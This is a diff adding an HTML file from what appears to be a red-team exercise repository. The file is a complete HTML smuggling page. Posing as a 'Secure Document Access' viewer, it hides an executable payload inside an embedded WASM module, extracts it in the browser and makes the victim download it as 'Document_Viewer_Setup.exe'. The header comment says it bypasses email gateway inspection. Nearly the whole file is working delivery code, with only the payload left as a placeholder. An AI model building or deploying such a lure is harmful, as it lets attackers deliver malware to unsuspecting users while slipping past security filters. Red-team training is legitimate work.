@@ -1,0 +1,188 @@
+<!--
+    Red Team Exercises #62 - WASM Smuggling for Payload Delivery
+    Author: Joas Antonio dos Santos
+    Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises
+    Courses: https://courses.redteamleaders.com/
+
+    Description:
+      Payload bytes are embedded inside a compiled WASM module.
+      When the page loads, JS instantiates the WASM, reads payload
+      from WASM linear memory, and triggers file download.
+      Bypasses most email gateway JS blob inspection.
+
+    Build:
+      python3 build_wasm_payload.py -i payload.exe -o delivery.html
+-->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Document Viewer - Secure Access Required</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+        }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; line-height: 1.6; }
+        .btn {
+            display: inline-block;
+            background: #0078d4;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+        .btn:hover { background: #006cc1; }
+        .spinner {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error-msg {
+            display: none;
+            color: #c00;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 24 24" fill="#0078d4">
+            <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
+        </svg>
+        <h2>Secure Document Access</h2>
+        <p>Your document is ready for download. Click below to access the file securely.</p>
+        <button class="btn" id="downloadBtn" onclick="deliverPayload()">Download Document</button>
+        <div class="spinner" id="spinner"></div>
+        <p id="status" style="display:none; color: green;">Download starting...</p>
+        <p class="error-msg" id="errorMsg"></p>
+    </div>
+
+    <script>
+    // ---------------------------------------------------------------
+    // WASM-based payload delivery
+    // The payload bytes live inside the WASM module's data segment,
+    // NOT in JavaScript. Most content inspection skips WASM binary.
+    // ---------------------------------------------------------------
+
+    const WASM_MODULE_B64 = "REPLACE_WITH_BASE64_WASM_MODULE";
+
+    function b64ToUint8Array(b64) {
+        // Chunked base64 decoding - handles large payloads that crash atob()
+        const binStr = atob(b64);
+        const len = binStr.length;
+        const bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binStr.charCodeAt(i);
+        }
+        return bytes;
+    }
+
+    function showError(msg) {
+        var el = document.getElementById('errorMsg');
+        el.textContent = msg;
+        el.style.display = 'block';
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('downloadBtn').style.display = 'inline-block';
+    }
+
+    async function deliverPayload() {
+        document.getElementById('downloadBtn').style.display = 'none';
+        document.getElementById('spinner').style.display = 'block';
+        document.getElementById('errorMsg').style.display = 'none';
+
+        try {
+            if (WASM_MODULE_B64 === "REPLACE_WITH" + "_BASE64_WASM_MODULE") {
+                showError("WASM module not embedded. Rebuild with build_wasm_payload.py.");
+                return;
+            }
+
+            // Decode WASM module from base64
+            var wasmBytes = b64ToUint8Array(WASM_MODULE_B64);
+
+            // Compile and instantiate via streaming for better memory handling
+            var wasmBlob = new Blob([wasmBytes], {type: 'application/wasm'});
+            var wasmResponse = new Response(wasmBlob);
+            var wasmModule;
+
+            try {
+                wasmModule = await WebAssembly.instantiateStreaming(wasmResponse);
+            } catch(_) {
+                // Fallback for browsers without streaming support
+                wasmModule = await WebAssembly.instantiate(wasmBytes);
+            }
+            var instance = wasmModule.instance;
+
+            // Get payload info from WASM exports
+            var payloadPtr = instance.exports.get_payload_ptr();
+            var payloadLen = instance.exports.get_payload_len();
+
+            // Read payload bytes from WASM linear memory
+            var memory = new Uint8Array(instance.exports.memory.buffer);
+            var payload = memory.slice(payloadPtr, payloadPtr + payloadLen);
+
+            // Free references to reduce memory
+            wasmBytes = null;
+            wasmBlob = null;
+
+            // Construct download blob
+            var blob = new Blob([payload], {type: 'application/octet-stream'});
+            var url = URL.createObjectURL(blob);
+
+            // Trigger download
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'Document_Viewer_Setup.exe';
+            document.body.appendChild(a);
+            a.click();
+
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+
+            // Cleanup
+            setTimeout(function() {
+                URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+            }, 1000);
+
+        } catch(e) {
+            console.error('Delivery error:', e);
+            showError('Document could not be loaded. Please try again.');
+        }
+    }
+    </script>
+</body>
+</html>
